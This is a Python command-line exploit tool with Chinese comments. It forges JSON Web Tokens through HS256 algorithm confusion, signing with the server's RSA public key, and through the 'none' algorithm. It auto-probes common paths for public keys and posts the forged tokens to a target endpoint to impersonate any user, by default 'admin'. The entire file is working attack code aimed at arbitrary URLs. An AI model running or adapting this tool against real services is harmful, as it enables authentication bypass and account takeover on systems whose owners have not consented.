#!/usr/bin/env python
# encoding: utf-8
# @author: rockmelodies
# @license: (C) Copyright 2013-2024, 360 Corporation Limited.
# @contact: rockysocket@gmail.com
# @software: garner
# @file: jwt.py
# @time: 2025/8/28 00:10
# @desc:


# !/usr/bin/env python3
"""
JWT Algorithm Confusion Exploit Tool
目标：利用不验证签名算法的JWT漏洞，为任意用户生成会话
"""

import jwt
import requests
import argparse
import json
import base64
import binascii
from urllib.parse import urljoin
import sys


class JWTAlgorithmConfusionExploit:
    def __init__(self, target_url, public_key_file=None, public_key=None):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        })

        if public_key:
            self.public_key = public_key
        elif public_key_file:
            with open(public_key_file, 'r') as f:
                self.public_key = f.read()
        else:
            self.public_key = None

    def generate_malicious_jwt(self, username, algorithm='HS256', custom_claims=None):
        """
        生成恶意JWT令牌
        """
        if not self.public_key:
            raise ValueError("Public key is required to generate malicious JWT")

        # 构造基本payload
        payload = {
            "sub": username,
            "username": username,
            "iat": 1716844328,  # 发行时间
            "exp": 1716930728  # 过期时间
        }

        # 添加自定义claims
        if custom_claims:
            payload.update(custom_claims)

        # 根据算法生成不同的恶意JWT
        if algorithm.upper() == 'HS256':
            # HS256算法混淆攻击
            token = jwt.encode(
                payload,
                key=self.public_key,  # 使用RS256公钥作为HS256的密钥
                algorithm='HS256'
            )
        elif algorithm.upper() == 'NONE':
            # None算法攻击
            header = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).decode().rstrip('=')

            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip('=')

            token = f"{header}.{payload_encoded}."
        else:
            raise ValueError(f"Unsupported algorithm: {algorithm}")

        return token

    def exploit_vulnerability(self, malicious_jwt, endpoint="/api/trusted-verify", param_name="action"):
        """
        利用漏洞发送恶意请求
        """
        exploit_url = urljoin(self.target_url, endpoint)

        data = {
            param_name: malicious_jwt
        }

        print(f"[*] Sending exploit request to: {exploit_url}")
        print(f"[*] Using JWT: {malicious_jwt}")

        try:
            response = self.session.post(exploit_url, data=data, timeout=10)

            print(f"[+] Response Status: {response.status_code}")
            print(f"[+] Response Headers:")
            for key, value in response.headers.items():
                if key.lower() in ['set-cookie', 'authorization', 'location']:
                    print(f"    {key}: {value}")

            # 检查是否成功获取了会话
            if 'session' in response.text.lower() or 'cookie' in response.text.lower():
                print("[+] Potential session token found in response!")

            return response

        except requests.exceptions.RequestException as e:
            print(f"[-] Request failed: {e}")
            return None

    def auto_detect_public_key(self):
        """
        尝试自动发现公钥（简化版）
        """
        common_paths = [
            '/.well-known/jwks.json',
            '/api/public-key',
            '/static/public.key',
            '/auth/public-key',
            '/jwks.json'
        ]

        print("[*] Attempting to discover public key...")

        for path in common_paths:
            try:
                url = urljoin(self.target_url, path)
                response = self.session.get(url, timeout=5)

                if response.status_code == 200:
                    content = response.text
                    # 尝试解析JWKS
                    if 'keys' in content:
                        try:
                            jwks = response.json()
                            if 'keys' in jwks and jwks['keys']:
                                # 这里简化处理，实际需要解析JWKS格式
                                print("[+] Found JWKS endpoint, but manual extraction needed")
                                return None
                        except:
                            pass

                    # 检查是否是PEM格式的公钥
                    if 'BEGIN PUBLIC KEY' in content or 'BEGIN RSA PUBLIC KEY' in content:
                        print(f"[+] Found public key at: {path}")
                        return content

            except:
                continue

        print("[-] Could not auto-discover public key")
        return None

    def test_vulnerability(self, username="admin"):
        """
        测试漏洞是否存在
        """
        if not self.public_key:
            print("[-] No public key provided, attempting auto-discovery...")
            discovered_key = self.auto_detect_public_key()
            if discovered_key:
                self.public_key = discovered_key
            else:
                print("[-] Please provide public key manually")
                return False

        print(f"[*] Testing vulnerability for user: {username}")

        # 测试HS256算法混淆
        try:
            malicious_jwt = self.generate_malicious_jwt(username, 'HS256')
            response = self.exploit_vulnerability(malicious_jwt)

            if response and response.status_code < 400:
                print("[+] HS256 algorithm confusion attack might be successful!")
                return True

        except Exception as e:
            print(f"[-] HS256 attack failed: {e}")

        # 测试None算法
        try:
            malicious_jwt = self.generate_malicious_jwt(username, 'NONE')
            response = self.exploit_vulnerability(malicious_jwt)

            if response and response.status_code < 400:
                print("[+] None algorithm attack might be successful!")
                return True

        except Exception as e:
            print(f"[-] None algorithm attack failed: {e}")

        print("[-] Vulnerability test completed - target may not be vulnerable")
        return False


def main():
    parser = argparse.ArgumentParser(description="JWT Algorithm Confusion Exploit Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--public-key", help="Path to public key file")
    parser.add_argument("-k", "--key-content", help="Public key content as string")
    parser.add_argument("-e", "--endpoint", default="/api/trusted-verify",
                        help="Vulnerable endpoint path")
    parser.add_argument("-n", "--param-name", default="action",
                        help="Parameter name for JWT")
    parser.add_argument("-user", "--username", default="admin",
                        help="Target username to impersonate")
    parser.add_argument("-t", "--test", action="store_true",
                        help="Test if target is vulnerable")
    parser.add_argument("-a", "--attack", action="store_true",
                        help="Perform the attack")
    parser.add_argument("-c", "--claims", help="Additional claims as JSON string")

    args = parser.parse_args()

    if not args.test and not args.attack:
        print("[-] Please specify either --test or --attack")
        sys.exit(1)

    # 初始化漏洞利用工具
    exploit_tool = JWTAlgorithmConfusionExploit(
        target_url=args.url,
        public_key_file=args.public_key,
        public_key=args.key_content
    )

    # 解析自定义claims
    custom_claims = {}
    if args.claims:
        try:
            custom_claims = json.loads(args.claims)
        except json.JSONDecodeError:
            print("[-] Invalid JSON format for claims")
            sys.exit(1)

    if args.test:
        print("[*] Starting vulnerability test...")
        exploit_tool.test_vulnerability(args.username)

    if args.attack:
        print("[*] Starting attack...")

        if not exploit_tool.public_key:
            print("[-] Public key is required for attack")
            sys.exit(1)

        try:
            # 生成恶意JWT
            malicious_jwt = exploit_tool.generate_malicious_jwt(
                args.username,
                'HS256',  # 优先尝试HS256
                custom_claims
            )

            print(f"[*] Generated malicious JWT for user '{args.username}':")
            print(f"    {malicious_jwt}")

            # 解码并显示JWT内容（用于验证）
            try:
                header, payload, signature = malicious_jwt.split('.')
                decoded_header = base64.urlsafe_b64decode(header + '==').decode()
                decoded_payload = base64.urlsafe_b64decode(payload + '==').decode()
                print(f"[*] JWT Header: {decoded_header}")
                print(f"[*] JWT Payload: {decoded_payload}")
            except:
                pass

            # 执行攻击
            response = exploit_tool.exploit_vulnerability(
                malicious_jwt,
                args.endpoint,
                args.param_name
            )

            if response:
                print("\n[*] Attack completed. Check response for session tokens.")

        except Exception as e:
            print(f"[-] Attack failed: {e}")
            import traceback
            traceback.print_exc()


if __name__ == "__main__":
    main()